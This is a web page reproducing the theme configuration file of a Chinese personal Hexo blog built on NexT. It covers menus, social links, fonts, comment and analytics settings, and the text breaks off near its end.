<h1 id="主题config配置信息"><a href="#主题config配置信息" class="headerlink" title="主题config配置信息"></a>主题config配置信息</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; ATTENTION! &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"># NexT repository is moving here: https:&#x2F;&#x2F;github.com&#x2F;theme-next</span><br><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"># It&#39;s rebase to v6.0.0 and future maintenance will resume there</span><br><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Theme Core Configuration Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Set to true, if you want to fully override the default configuration.</span><br><span class="line"># Useful if you don&#39;t want to inherit the theme _config.yml configurations.</span><br><span class="line">override: false</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Site Information Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># To get or check favicons visit: https:&#x2F;&#x2F;realfavicongenerator.net</span><br><span class="line"># Put your favicons into &#96;hexo-site&#x2F;source&#x2F;&#96; (recommend) or &#96;hexo-site&#x2F;themes&#x2F;next&#x2F;source&#x2F;images&#x2F;&#96; directory.</span><br><span class="line"></span><br><span class="line"># Default NexT favicons placed in &#96;hexo-site&#x2F;themes&#x2F;next&#x2F;source&#x2F;images&#x2F;&#96; directory.</span><br><span class="line"># And if you want to place your icons in &#96;hexo-site&#x2F;source&#x2F;&#96; root directory, you must remove &#96;&#x2F;images&#96; prefix from pathes.</span><br><span class="line"></span><br><span class="line"># For example, you put your favicons into &#96;hexo-site&#x2F;source&#x2F;images&#96; directory.</span><br><span class="line"># Then need to rename &amp; redefine they on any other names, otherwise icons from Next will rewrite your custom icons in Hexo.</span><br><span class="line">favicon:</span><br><span class="line">  small: &#x2F;images&#x2F;favicon-16x16-next .png</span><br><span class="line">  medium: &#x2F;images&#x2F;favicon-32x32-next.png</span><br><span class="line">  apple_touch_icon: &#x2F;images&#x2F;apple-touch-icon-next.png</span><br><span class="line">  safari_pinned_tab: &#x2F;images&#x2F;logo.svg</span><br><span class="line">  #android_manifest: &#x2F;images&#x2F;manifest.json</span><br><span class="line">  #ms_browserconfig: &#x2F;images&#x2F;browserconfig.xml</span><br><span class="line"></span><br><span class="line"># Set default keywords (Use a comma to separate)</span><br><span class="line">keywords: &quot;Hexo个人博客,NexT美化优化,哈林摇,Mac Panel特效,Leaf,北宸,Java程序员,北京,旅行,摄像,Github Pages,搭建教程,demo,博客相册,文章排行榜,网站SEO&quot;</span><br><span class="line"></span><br><span class="line"># Set rss to false to disable feed link.</span><br><span class="line"># Leave rss as empty to use site&#39;s feed link.</span><br><span class="line"># Set rss to specific value if you have burned your feed already.</span><br><span class="line">rss: &#x2F;atom.xml</span><br><span class="line"></span><br><span class="line">footer:</span><br><span class="line">  # Specify the date when the site was setup.</span><br><span class="line">  # If not defined, current year will be used.</span><br><span class="line">  since: 2020 #建站时间</span><br><span class="line"></span><br><span class="line">  # Icon between year and copyright info.</span><br><span class="line">#  icon: user</span><br><span class="line">#  icon: heart #底部心形图案</span><br><span class="line">  icon: heartbeat #底部心形图案</span><br><span class="line"></span><br><span class="line">  # If not defined, will be used &#96;author&#96; from Hexo main config.</span><br><span class="line">  copyright:</span><br><span class="line">  # -------------------------------------------------------------</span><br><span class="line">  # Hexo link (Powered by Hexo).</span><br><span class="line">  powered: false</span><br><span class="line"></span><br><span class="line">  theme:</span><br><span class="line">    # Theme &amp; scheme info link (Theme - NexT.scheme).</span><br><span class="line">    enable: false</span><br><span class="line">    # Version info of NexT after scheme info (vX.X.X).</span><br><span class="line">    version: false</span><br><span class="line"></span><br><span class="line">  # 网站底部运行时间</span><br><span class="line">  runtime:</span><br><span class="line">    enable: true</span><br><span class="line">    birthday: &quot;07&#x2F;02&#x2F;2020 10:00:00&quot;</span><br><span class="line">    color: &quot;#1890ff&quot;</span><br><span class="line">  # 网站底部uv pv</span><br><span class="line">  diy_visit:</span><br><span class="line">    enable: true</span><br><span class="line"></span><br><span class="line">  # -------------------------------------------------------------</span><br><span class="line">  # Any custom text can be defined here.</span><br><span class="line">  #custom_text: Hosted by &lt;a target&#x3D;&quot;_blank&quot; href&#x3D;&quot;https:&#x2F;&#x2F;pages.github.com&quot;&gt;GitHub Pages&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># SEO Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Canonical, set a canonical link tag in your hexo, you could use it for your SEO of blog.</span><br><span class="line"># See: https:&#x2F;&#x2F;support.google.com&#x2F;webmasters&#x2F;answer&#x2F;139066</span><br><span class="line"># Tips: Before you open this tag, remember set up your URL in hexo _config.yml ( ex. url: http:&#x2F;&#x2F;yourdomain.com )</span><br><span class="line">canonical: true</span><br><span class="line"></span><br><span class="line"># Change headers hierarchy on site-subtitle (will be main site description) and on all post&#x2F;pages titles for better SEO-optimization.</span><br><span class="line">seo: true # description的描述会不显示</span><br><span class="line"></span><br><span class="line"># If true, will add site-subtitle to index page, added in main hexo config.</span><br><span class="line"># subtitle: Subtitle</span><br><span class="line">index_with_subtitle: true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Menu Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># When running the site in a subdirectory (e.g. domain.tld&#x2F;blog), remove the leading slash from link value (&#x2F;archives -&gt; archives).</span><br><span class="line"># Usage: &#96;Key: &#x2F;link&#x2F; || icon&#96;</span><br><span class="line"># Key is the name of menu item. If translate for this menu will find in languages - this translate will be loaded; if not - Key name will be used. Key is case-senstive.</span><br><span class="line"># Value before &#96;||&#96; delimeter is the target link.</span><br><span class="line"># Value after &#96;||&#96; delimeter is the name of FontAwesome icon. If icon (with or without delimeter) is not specified, question icon will be loaded.</span><br><span class="line">menu:</span><br><span class="line">  home: &#x2F;|| home</span><br><span class="line"> # top: top || signal</span><br><span class="line">  archives: &#x2F;archives&#x2F;||archive</span><br><span class="line">  categories: &#x2F;categories&#x2F; || th</span><br><span class="line">  tags: &#x2F;tags&#x2F; || tags</span><br><span class="line">  life: &#x2F;life&#x2F; || apple</span><br><span class="line"> # movies: &#x2F;movies&#x2F; || film</span><br><span class="line">#  xiaohutong: &#x2F;xiaohutong || map</span><br><span class="line">#  sitemap: &#x2F;sitemap.xml || sitemap</span><br><span class="line">  #schedule: &#x2F;schedule&#x2F; || calendar</span><br><span class="line">  #commonweal: &#x2F;404&#x2F; || heartbeat</span><br><span class="line">#  links: &#x2F;links&#x2F; || link</span><br><span class="line">  about: &#x2F;about&#x2F; || user</span><br><span class="line"></span><br><span class="line"># Enable&#x2F;Disable menu icons.</span><br><span class="line">menu_icons:</span><br><span class="line">  enable: true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Scheme Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Schemes</span><br><span class="line">#scheme: Muse</span><br><span class="line">#scheme: Mist</span><br><span class="line">scheme: Pisces</span><br><span class="line">#scheme: Gemini</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Sidebar Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Social Links.</span><br><span class="line"># Usage: &#96;Key: permalink || icon&#96;</span><br><span class="line"># Key is the link label showing to end users.</span><br><span class="line"># Value before &#96;||&#96; delimeter is the target permalink.</span><br><span class="line"># Value after &#96;||&#96; delimeter is the name of FontAwesome icon. If icon (with or without delimeter) is not specified, globe icon will be loaded.</span><br><span class="line">#social:</span><br><span class="line">  #GitHub: https:&#x2F;&#x2F;github.com&#x2F;yourname || github</span><br><span class="line">  #E-Mail: mailto:yourname@gmail.com || envelope</span><br><span class="line">  #Google: https:&#x2F;&#x2F;plus.google.com&#x2F;yourname || google</span><br><span class="line">  #Twitter: https:&#x2F;&#x2F;twitter.com&#x2F;yourname || twitter</span><br><span class="line">  #FB Page: https:&#x2F;&#x2F;www.facebook.com&#x2F;yourname || facebook</span><br><span class="line">  #VK Group: https:&#x2F;&#x2F;vk.com&#x2F;yourname || vk</span><br><span class="line">  #StackOverflow: https:&#x2F;&#x2F;stackoverflow.com&#x2F;yourname || stack-overflow</span><br><span class="line">  #YouTube: https:&#x2F;&#x2F;youtube.com&#x2F;yourname || youtube</span><br><span class="line">  #Instagram: https:&#x2F;&#x2F;instagram.com&#x2F;yourname || instagram</span><br><span class="line">  #Skype: skype:yourname?call|chat || skype</span><br><span class="line"></span><br><span class="line">social:</span><br><span class="line">  GitHub: https:&#x2F;&#x2F;github.com&#x2F;GYLQ&#x2F;GYLQ.github.io || github</span><br><span class="line">  E-Mail: mailto:2324298829@qq.com || envelope</span><br><span class="line">  微博: https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5828235984?refer_flag&#x3D;1005055010_ || weibo</span><br><span class="line">  喜马拉雅: https:&#x2F;&#x2F;www.ximalaya.com&#x2F;zhubo&#x2F;146380077 || twitter</span><br><span class="line">  哔哩哔哩: https:&#x2F;&#x2F;space.bilibili.com&#x2F;13563835 || apple</span><br><span class="line">  #Facebook: https:&#x2F;&#x2F;www.facebook.com&#x2F;jame.leaf.94 || facebook</span><br><span class="line">  #Witter: https:&#x2F;&#x2F;twitter.com&#x2F;Leafjame || twitter</span><br><span class="line">  #YouTube: https:&#x2F;&#x2F;youtube.com&#x2F;channel&#x2F;UCtzIJK9eLCWLQF13KpZE-0w  || youtube</span><br><span class="line">  #Jianshu: https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;3b74c7b81348 || instagram</span><br><span class="line"></span><br><span class="line">social_icons:</span><br><span class="line">  enable: true</span><br><span class="line">  icons_only: true</span><br><span class="line">  transition: false</span><br><span class="line"></span><br><span class="line"># Blog rolls</span><br><span class="line">links_icon: link</span><br><span class="line">links_title: 友情链接</span><br><span class="line">links_layout: block</span><br><span class="line">#links_layout: inline</span><br><span class="line">links:</span><br><span class="line">  #daovoice: http:&#x2F;&#x2F;www.daovoice.io&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sidebar Avatar</span><br><span class="line"># in theme directory(source&#x2F;images): &#x2F;images&#x2F;avatar.gif</span><br><span class="line"># in site  directory(source&#x2F;uploads): &#x2F;uploads&#x2F;avatar.gif</span><br><span class="line">#avatar: &#x2F;images&#x2F;avatar.gif</span><br><span class="line"></span><br><span class="line">avatar: &#x2F;images&#x2F;qq.png</span><br><span class="line"></span><br><span class="line"># Table Of Contents in the Sidebar</span><br><span class="line">toc:</span><br><span class="line">  enable: true</span><br><span class="line"></span><br><span class="line">  # Automatically add list number to toc.</span><br><span class="line">  number: true</span><br><span class="line"></span><br><span class="line">  # If true, all words will placed on next lines if header width longer then sidebar width.</span><br><span class="line">  wrap: false</span><br><span class="line"></span><br><span class="line"># Creative Commons 4.0 International License.</span><br><span class="line"># http:&#x2F;&#x2F;creativecommons.org&#x2F;</span><br><span class="line"># Available: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero</span><br><span class="line">#creative_commons: by-nc-sa</span><br><span class="line">#creative_commons:</span><br><span class="line"></span><br><span class="line">sidebar:</span><br><span class="line">  # Sidebar Position, available value: left | right (only for Pisces | Gemini).</span><br><span class="line">  position: left</span><br><span class="line">  #position: right</span><br><span class="line"></span><br><span class="line">  # Sidebar Display, available value (only for Muse | Mist):</span><br><span class="line">  #  - post    expand on posts automatically. Default.</span><br><span class="line">  #  - always  expand for all pages automatically</span><br><span class="line">  #  - hide    expand only when click on the sidebar toggle icon.</span><br><span class="line">  #  - remove  Totally remove sidebar including sidebar toggle.</span><br><span class="line">  display: post</span><br><span class="line">  #display: always</span><br><span class="line">  #display: hide</span><br><span class="line">  #display: remove</span><br><span class="line"></span><br><span class="line">  # Sidebar offset from top menubar in pixels (only for Pisces | Gemini).</span><br><span class="line">  offset: 12</span><br><span class="line"></span><br><span class="line">  # Back to top in sidebar (only for Pisces | Gemini).</span><br><span class="line">  b2t: false</span><br><span class="line"></span><br><span class="line">  # Scroll percent label in b2t button.</span><br><span class="line">  scrollpercent: true</span><br><span class="line"></span><br><span class="line">  # Enable sidebar on narrow view (only for Muse | Mist). such as #scheme: Muse  #scheme: Mist</span><br><span class="line">  onmobile: true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Post Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Automatically scroll page to section which is under &lt;!-- more --&gt; mark.</span><br><span class="line">scroll_to_more: false</span><br><span class="line"></span><br><span class="line"># Automatically saving scroll position on each post&#x2F;page in cookies.</span><br><span class="line">save_scroll: false</span><br><span class="line"></span><br><span class="line"># Automatically excerpt description in homepage as preamble text.</span><br><span class="line">excerpt_description: true</span><br><span class="line"></span><br><span class="line"># Automatically Excerpt. Not recommend.</span><br><span class="line"># Please use &lt;!-- more --&gt; in the post to control excerpt accurately.</span><br><span class="line">auto_excerpt:</span><br><span class="line">  enable: true</span><br><span class="line">  length: 150</span><br><span class="line"></span><br><span class="line"># Post meta display settings</span><br><span class="line">post_meta:</span><br><span class="line">  item_text: false #隐藏文章标题下方&#39;发表于&#39;..文字</span><br><span class="line">  created_at: true</span><br><span class="line">  updated_at: false</span><br><span class="line">  categories: true</span><br><span class="line"></span><br><span class="line"># Post wordcount display settings</span><br><span class="line"># Dependencies: https:&#x2F;&#x2F;github.com&#x2F;willin&#x2F;hexo-wordcount</span><br><span class="line">post_wordcount:</span><br><span class="line">  item_text: false</span><br><span class="line">  wordcount: true</span><br><span class="line">  min2read: false</span><br><span class="line">  totalcount: true</span><br><span class="line">  separated_meta: false</span><br><span class="line"></span><br><span class="line"># Wechat Subscriber</span><br><span class="line">#wechat_subscriber:</span><br><span class="line">  #enabled: true</span><br><span class="line">  #qcode: &#x2F;path&#x2F;to&#x2F;your&#x2F;wechatqcode ex. &#x2F;uploads&#x2F;wechat-qcode.jpg</span><br><span class="line">  #description: ex. subscribe to my blog by scanning my public wechat account</span><br><span class="line"></span><br><span class="line"># Reward</span><br><span class="line">#reward_comment: Donate comment here</span><br><span class="line">wechatpay: &#x2F;images&#x2F;wechatpay.jpg</span><br><span class="line">alipay: &#x2F;images&#x2F;alipay.jpg</span><br><span class="line">#bitcoin: &#x2F;images&#x2F;bitcoin.png</span><br><span class="line"></span><br><span class="line">reward_comment: 坚持原创技术分享，感谢您的支持和鼓励！</span><br><span class="line">#wechatpay: &#x2F;images&#x2F;wechatpay.jpg</span><br><span class="line">#alipay: &#x2F;images&#x2F;alipay.jpg</span><br><span class="line"></span><br><span class="line"># Declare license on posts</span><br><span class="line">post_copyright:</span><br><span class="line">  enable: false</span><br><span class="line">  license: CC BY-NC-SA 3.0</span><br><span class="line">  license_url: https:&#x2F;&#x2F;creativecommons.org&#x2F;licenses&#x2F;by-nc-sa&#x2F;3.0&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Misc Theme Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Reduce padding &#x2F; margin indents on devices with narrow width.</span><br><span class="line">mobile_layout_economy: false #开启会影起文章边框消失</span><br><span class="line"></span><br><span class="line"># Android Chrome header panel color ($black-deep).</span><br><span class="line">android_chrome_color: &quot;#222&quot;</span><br><span class="line"></span><br><span class="line"># Custom Logo.</span><br><span class="line"># !!Only available for Default Scheme currently.</span><br><span class="line"># Options:</span><br><span class="line">#   enabled: [true&#x2F;false] - Replace with specific image</span><br><span class="line">#   image: url-of-image   - Images&#39;s url</span><br><span class="line">custom_logo:</span><br><span class="line">  enabled: false</span><br><span class="line">  image:</span><br><span class="line"></span><br><span class="line"># Code Highlight theme</span><br><span class="line"># Available value:</span><br><span class="line">#    normal | night | night eighties | night blue | night bright</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;chriskempson&#x2F;tomorrow-theme</span><br><span class="line">highlight_theme: normal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Font Settings</span><br><span class="line"># - Find fonts on Google Fonts (https:&#x2F;&#x2F;www.google.com&#x2F;fonts)</span><br><span class="line"># - All fonts set here will have the following styles:</span><br><span class="line">#     light, light italic, normal, normal italic, bold, bold italic</span><br><span class="line"># - Be aware that setting too much fonts will cause site running slowly</span><br><span class="line"># - Introduce in 5.0.1</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># CAUTION! Safari Version 10.1.2 bug: https:&#x2F;&#x2F;github.com&#x2F;iissnan&#x2F;hexo-theme-next&#x2F;issues&#x2F;1844</span><br><span class="line"># To avoid space between header and sidebar in Pisces &#x2F; Gemini themes recommended to use Web Safe fonts for &#96;global&#96; (and &#96;logo&#96;):</span><br><span class="line"># Arial | Tahoma | Helvetica | Times New Roman | Courier New | Verdana | Georgia | Palatino | Garamond | Comic Sans MS | Trebuchet MS</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line">font:</span><br><span class="line">  enable: true</span><br><span class="line"></span><br><span class="line">  # Uri of fonts host. E.g. &#x2F;&#x2F;fonts.googleapis.com (Default).</span><br><span class="line">  # Google 字体 国内镜像</span><br><span class="line">  host:</span><br><span class="line"></span><br><span class="line">  # Font options:</span><br><span class="line">  # &#96;external: true&#96; will load this font family from &#96;host&#96; above.</span><br><span class="line">  # &#96;family: Times New Roman&#96;. Without any quotes.</span><br><span class="line">  # &#96;size: xx&#96;. Use &#96;px&#96; as unit.</span><br><span class="line"></span><br><span class="line">  # Global font settings used on &lt;body&gt; element.</span><br><span class="line">  global:</span><br><span class="line">    external: true</span><br><span class="line">#    family: Lato</span><br><span class="line">    family: EB Garamond # 字体参考：https:&#x2F;&#x2F;io-oi.me&#x2F;tech&#x2F;noto-serif-sc-added-on-google-fonts&#x2F;#main</span><br><span class="line">    size: 16</span><br><span class="line"></span><br><span class="line">  # Font settings for Headlines (h1, h2, h3, h4, h5, h6).</span><br><span class="line">  # Fallback to &#96;global&#96; font settings.</span><br><span class="line">  headings:</span><br><span class="line">    external: true</span><br><span class="line">    family:</span><br><span class="line">    size:</span><br><span class="line"></span><br><span class="line">  # Font settings for posts.</span><br><span class="line">  # Fallback to &#96;global&#96; font settings.</span><br><span class="line">  posts:</span><br><span class="line">    external: true</span><br><span class="line">    family:</span><br><span class="line"></span><br><span class="line">  # Font settings for Logo.</span><br><span class="line">  # Fallback to &#96;global&#96; font settings.</span><br><span class="line">  logo:</span><br><span class="line">    external: true</span><br><span class="line">    family:</span><br><span class="line">    size:</span><br><span class="line"></span><br><span class="line">  # Font settings for &lt;code&gt; and code blocks.</span><br><span class="line">  codes:</span><br><span class="line">    external: true</span><br><span class="line">    family:</span><br><span class="line">    size:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Third Party Services Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># MathJax Support</span><br><span class="line">mathjax:</span><br><span class="line">  enable: false</span><br><span class="line">  per_page: false</span><br><span class="line">  cdn: &#x2F;&#x2F;cdn.bootcss.com&#x2F;mathjax&#x2F;2.7.1&#x2F;latest.js?config&#x3D;TeX-AMS-MML_HTMLorMML</span><br><span class="line"></span><br><span class="line"># Han Support docs: https:&#x2F;&#x2F;hanzi.pro&#x2F;</span><br><span class="line">han: false</span><br><span class="line"></span><br><span class="line"># Swiftype Search API Key</span><br><span class="line">#swiftype_key:</span><br><span class="line"></span><br><span class="line"># Baidu Analytics ID 百度统计</span><br><span class="line">baidu_analytics: b56c2f3ac99ab0c4efa4cba7755ec64a</span><br><span class="line"></span><br><span class="line"># Duoshuo ShortName</span><br><span class="line">#duoshuo_shortname:</span><br><span class="line"></span><br><span class="line"># Disqus</span><br><span class="line">disqus:</span><br><span class="line">  enable: false</span><br><span class="line">  shortname:</span><br><span class="line">  count: true</span><br><span class="line"></span><br><span class="line"># Hypercomments</span><br><span class="line">#hypercomments_id:</span><br><span class="line"></span><br><span class="line"># changyan</span><br><span class="line">changyan:</span><br><span class="line">  enable: false</span><br><span class="line">  appid:</span><br><span class="line">  appkey:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Valine.</span><br><span class="line"># You can get your appid and appkey from https:&#x2F;&#x2F;leancloud.cn</span><br><span class="line"># more info please open https:&#x2F;&#x2F;valine.js.org</span><br><span class="line">valine:</span><br><span class="line">  enable: true</span><br><span class="line">  appid: HzU5gDhBUYHF8QTF8DmbGhjD-gzGzoHsz # your leancloud application appid</span><br><span class="line">  appkey: wp1HNJ17SdpnE0wIFq99eTKH # your leancloud application appkey</span><br><span class="line">  notify: True # mail notifier: https:&#x2F;&#x2F;valine.js.org&#x2F;notify.html # 20190903使用Valine-Admin：参考 https:&#x2F;&#x2F;deserts.io&#x2F;valine-admin-document&#x2F;</span><br><span class="line">  verify: True # Verification code &#x2F;&#x2F;使用Valine-Admin</span><br><span class="line">  placeholder: &#39;&amp;#x270d;&amp;nbsp;写评论&#39;  # comment box placeholder</span><br><span class="line">  avatar: gravatar # gravatar style</span><br><span class="line">  guest_info: nick,mail,link # custom comment header</span><br><span class="line">  pageSize: 10 # pagination size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Support for youyan comments system.</span><br><span class="line"># You can get your uid from http:&#x2F;&#x2F;www.uyan.cc</span><br><span class="line">#youyan_uid: your uid</span><br><span class="line"></span><br><span class="line"># Support for LiveRe comments system.</span><br><span class="line"># You can get your uid from https:&#x2F;&#x2F;livere.com&#x2F;insight&#x2F;myCode (General web site)</span><br><span class="line">#livere_uid: your uid</span><br><span class="line"></span><br><span class="line">livere:</span><br><span class="line">  on: False</span><br><span class="line">  livere_uid: MTAyMC81MDg1NC8yNzMzNg&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line"># Gitment</span><br><span class="line"># Introduction: https:&#x2F;&#x2F;imsun.net&#x2F;posts&#x2F;gitment-introduction&#x2F;</span><br><span class="line"># You can get your Github ID from https:&#x2F;&#x2F;api.github.com&#x2F;users&#x2F;&lt;Github username&gt;</span><br><span class="line">gitment:</span><br><span class="line">  enable: false</span><br><span class="line">  mint: true # RECOMMEND, A mint on Gitment, to support count, language and proxy_gateway</span><br><span class="line">  count: true # Show comments count in post meta area</span><br><span class="line">  lazy: false # Comments lazy loading with a button</span><br><span class="line">  cleanly: false # Hide &#39;Powered by ...&#39; on footer, and more</span><br><span class="line">  language: # Force language, or auto switch by theme</span><br><span class="line">  github_user: # MUST HAVE, Your Github ID</span><br><span class="line">  github_repo: # MUST HAVE, The repo you use to store Gitment comments</span><br><span class="line">  client_id: # MUST HAVE, Github client id for the Gitment</span><br><span class="line">  client_secret: # EITHER this or proxy_gateway, Github access secret token for the Gitment</span><br><span class="line">  proxy_gateway: # Address of api proxy, See: https:&#x2F;&#x2F;github.com&#x2F;aimingoo&#x2F;intersect</span><br><span class="line">  redirect_protocol: # Protocol of redirect_uri with force_redirect_protocol when mint enabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Baidu Share</span><br><span class="line"># Available value:</span><br><span class="line">#    button | slide</span><br><span class="line"># Warning: Baidu Share does not support https.</span><br><span class="line">#baidushare:</span><br><span class="line">##  type: button</span><br><span class="line"></span><br><span class="line">#baidushare:</span><br><span class="line">#  type:  # 设置分享按钮的风格，有button何slide形式</span><br><span class="line"></span><br><span class="line"># Share</span><br><span class="line"># This plugin is more useful in China, make sure you known how to use it.</span><br><span class="line"># And you can find the use guide at official webiste: http:&#x2F;&#x2F;www.jiathis.com&#x2F;.</span><br><span class="line"># Warning: JiaThis does not support https.</span><br><span class="line">#jiathis:</span><br><span class="line">  ##uid: Get this uid from http:&#x2F;&#x2F;www.jiathis.com&#x2F;</span><br><span class="line">#add_this_id:</span><br><span class="line"></span><br><span class="line"># Share</span><br><span class="line">#duoshuo_share: true</span><br><span class="line"></span><br><span class="line"># NeedMoreShare2</span><br><span class="line"># This plugin is a pure javascript sharing lib which is useful in China.</span><br><span class="line"># See: https:&#x2F;&#x2F;github.com&#x2F;revir&#x2F;need-more-share2</span><br><span class="line"># Also see: https:&#x2F;&#x2F;github.com&#x2F;DzmVasileusky&#x2F;needShareButton</span><br><span class="line"># iconStyle: default | box</span><br><span class="line"># boxForm: horizontal | vertical</span><br><span class="line"># position: top &#x2F; middle &#x2F; bottom + Left &#x2F; Center &#x2F; Right</span><br><span class="line"># networks: Weibo,Wechat,Douban,QQZone,Twitter,Linkedin,Mailto,Reddit,</span><br><span class="line">#           Delicious,StumbleUpon,Pinterest,Facebook,GooglePlus,Slashdot,</span><br><span class="line">#           Technorati,Posterous,Tumblr,GoogleBookmarks,Newsvine,</span><br><span class="line">#           Evernote,Friendfeed,Vkontakte,Odnoklassniki,Mailru</span><br><span class="line">needmoreshare2:</span><br><span class="line">  enable: false</span><br><span class="line">  postbottom:</span><br><span class="line">    enable: false</span><br><span class="line">    options:</span><br><span class="line">      iconStyle: box</span><br><span class="line">      boxForm: horizontal</span><br><span class="line">      position: bottomCenter</span><br><span class="line">      networks: Weibo,Wechat,Douban,QQZone,Twitter,Facebook</span><br><span class="line">  float:</span><br><span class="line">    enable: false</span><br><span class="line">    options:</span><br><span class="line">      iconStyle: box</span><br><span class="line">      boxForm: horizontal</span><br><span class="line">      position: middleRight</span><br><span class="line">      networks: Weibo,Wechat,Douban,QQZone,Twitter,Facebook</span><br><span class="line"></span><br><span class="line">#  站点验证</span><br><span class="line"># Google Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;www.google.com&#x2F;webmasters&#x2F;</span><br><span class="line">google_site_verification: </span><br><span 